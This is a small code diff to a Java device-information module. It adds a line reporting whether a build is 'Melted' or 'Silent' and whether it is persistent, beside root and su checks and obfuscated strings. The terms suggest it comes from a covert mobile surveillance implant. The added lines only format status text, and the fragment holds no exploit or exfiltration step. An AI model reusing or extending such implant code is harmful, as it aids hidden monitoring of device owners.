@@ -136,6 +136,9 @@ public class ModuleDevice extends BaseInstantModule {
 			boolean root = checkRoot();
 			boolean su = Status.self().haveSu();
 
+			sb.insert(0, M.e("Build:") + (Status.self().isMelted() ? M.e("Melted ") : M.e("Silent "))
+										+ (Status.self().isPersistent()?M.e(" persistence"):"")+ "\n");
+
 			if(Cfg.DEMO) {
 				sb.insert(0, M.e("BinaryPatched:") + Keys.self().binarypatch[8] + "\n");
 			}
